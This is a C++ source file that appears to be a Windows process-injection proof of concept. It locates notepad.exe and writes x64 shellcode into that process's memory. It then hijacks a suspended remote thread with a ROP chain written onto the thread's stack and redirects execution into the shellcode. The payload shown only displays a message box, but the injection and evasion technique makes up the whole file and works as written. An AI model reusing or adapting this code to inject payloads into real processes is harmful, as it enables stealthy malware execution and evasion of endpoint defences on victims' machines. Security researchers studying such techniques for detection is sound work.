#include <iostream>
using namespace std;

#include "ROPBuffer.h"
#include "ROPHelper.h"

#include <TlHelp32.h>

DWORD name2pid(LPCWSTR ProcessName) {
	DWORD dwProcessId = 0;
	LPPROCESSENTRY32 lppe = new PROCESSENTRY32();

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	lppe->dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnapshot, lppe)) {
		do {
			if (lstrcmp(lppe->szExeFile, ProcessName) == 0) {
				dwProcessId = lppe->th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, lppe));
	}

	CloseHandle(hSnapshot);
	return dwProcessId;
}

int main() {
	DWORD dwProcessId{ 0 };
	HANDLE hProcess{ 0 };
	LPVOID lpBaseAddress{ nullptr };
	DWORD dwThreadId{ 0 };
	HANDLE hThread{ 0 };

	CONTEXT ThreadContext{ 0 };
	ThreadContext.ContextFlags = CONTEXT_ALL;

	dwProcessId = name2pid(TEXT("notepad.exe"));
	cout << "Target process id is " << dwProcessId << endl;

	unsigned char Shellcode[] = {
	   0x48, 0x83, 0xec, 0x28,
	   0x48, 0x83, 0xe4, 0xf0,
	   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00,0x00,
	   0x49, 0xb8, 0x12, 0x12, 0x12, 0x12, 0x12,
	   0x12, 0x12, 0x12,
	   0x48, 0xba, 0x23, 0x23, 0x23, 0x23, 0x23,
	   0x23, 0x23, 0x23,
	   0x45, 0x33, 0xc9,
	   0x48, 0xb8, 0x34, 0x34, 0x34, 0x34, 0x34,
	   0x34, 0x34, 0x34,
	   0xff, 0xd0,
	   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,
	   0x48, 0xb8, 0x45, 0x45, 0x45, 0x45, 0x45,
	   0x45, 0x45, 0x45,
	   0xff, 0xd0,
	   'I', 'n', 'j', 'e', 'c', 't', 0x00,
	};

	cout << "Finding gadgets addresses" << endl;
	FindFunctionAddresses();

	cout << "Opening target process handle" << endl;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	cout << "Allocating READ/WRITE memory for shellcode" << endl;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(2), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);

	LPVOID RemoteShellcodeAddress = (LPVOID)((ULONGLONG)lpBaseAddress + 0x100);

	*((ULONGLONG*)&Shellcode[0x11]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&Shellcode[0x1b]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&Shellcode[0x28]) = MessageBoxAddress;
	*((ULONGLONG*)&Shellcode[0x3b]) = RtlExitUserThreadAddress;

	cout << "Copying shellcode into target process" << endl;
	WriteProcessMemory(hProcess, RemoteShellcodeAddress, Shellcode, sizeof(Shellcode), NULL);

	cout << "Creating new suspended thread on target process" << endl;
	hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)RtlExitUserThreadAddress,
		NULL,
		CREATE_SUSPENDED,
		&dwThreadId
	);

	cout << "Fetching new thread's context" << endl;
	GetThreadContext(hThread, &ThreadContext);

	{
		ROPBuffer Rop(ThreadContext.Rsp - 0x100, 0x20);

		ULONGLONG ShellcodeSize = sizeof(Shellcode);

		BuildSimpleRop(&Rop, ShellcodeSize, (ULONGLONG)RemoteShellcodeAddress);

		ThreadContext.Rip = Rop.GetRip();
		ThreadContext.Rsp = Rop.GetRsp();

		cout << "Writing ROP into target stack" << endl;
		WriteProcessMemory(hProcess, (LPVOID)ThreadContext.Rsp, Rop.GetBuffer(), Rop.GetBufferSize(), NULL);
		cout << (LPVOID)ThreadContext.Rsp << endl;
	}

	cout << "Setting thread's context to first gadget" << endl;
	SetThreadContext(hThread, &ThreadContext);

	cout << "Resuming thread's execution" << endl;
	ResumeThread(hThread);

	if (hThread)
		CloseHandle(hThread);
	if (hProcess)
		CloseHandle(hProcess);
}